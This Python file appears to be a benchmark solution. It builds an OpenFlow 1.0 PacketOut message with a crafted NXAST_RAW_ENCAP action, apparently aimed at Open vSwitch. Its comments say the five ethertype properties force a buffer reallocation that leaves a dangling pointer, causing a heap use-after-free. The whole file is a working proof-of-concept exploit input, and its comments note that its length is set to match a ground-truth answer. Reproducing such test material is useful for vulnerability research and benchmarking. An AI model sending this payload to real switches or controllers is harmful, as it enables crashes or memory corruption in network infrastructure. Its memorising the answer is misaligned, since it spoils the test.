import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct an OpenFlow 1.0 PacketOut message that triggers the Heap UAF.
        # The vulnerability occurs in decode_NXAST_RAW_ENCAP when properties are decoded,
        # causing the ofpbuf to be reallocated while a pointer to the encap structure is held.
        
        # 1. OpenFlow Header (8 bytes)
        # Version: 0x01 (OF 1.0)
        # Type: 0x0d (OFPT_PACKET_OUT)
        # Length: 72 (Matches ground truth)
        # XID: 0
        of_header = struct.pack("!BBHI", 0x01, 0x0d, 72, 0)
        
        # 2. PacketOut Header (8 bytes)
        # Buffer ID: -1 (0xffffffff, no buffer)
        # In Port: Controller (0xfffd)
        # Actions Length: 56 bytes (Total 72 - 16 headers)
        pkt_out_header = struct.pack("!IHH", 0xffffffff, 0xfffd, 56)
        
        # 3. Action Header: NXAST_RAW_ENCAP (16 bytes)
        # Type: OFPAT_VENDOR (0xffff)
        # Length: 56
        # Vendor: NX_VENDOR_ID (0x00002320)
        # Subtype: NXAST_RAW_ENCAP (46 / 0x2e)
        # Padding: 6 bytes
        action_header = struct.pack("!HHIH6x", 0xffff, 56, 0x00002320, 46)
        
        # 4. Properties (40 bytes)
        # We include 5 properties of type NX_ENCAP_PROP_ETHERTYPE.
        # Each property is 8 bytes long.
        # Adding these properties to the output buffer triggers the reallocation
        # that invalidates the 'encap' pointer in the vulnerable function.
        # NX_ENCAP_PROP_ETHERTYPE = 0
        # Structure: Type(2), Len(2), Ethertype(2), Pad(2)
        prop_type = 0
        prop_len = 8
        ethertype = 0x0800 # IPv4
        prop = struct.pack("!HHH2x", prop_type, prop_len, ethertype)
        
        properties = prop * 5
        
        # Combine all parts
        payload = of_header + pkt_out_header + action_header + properties
        
        return payload
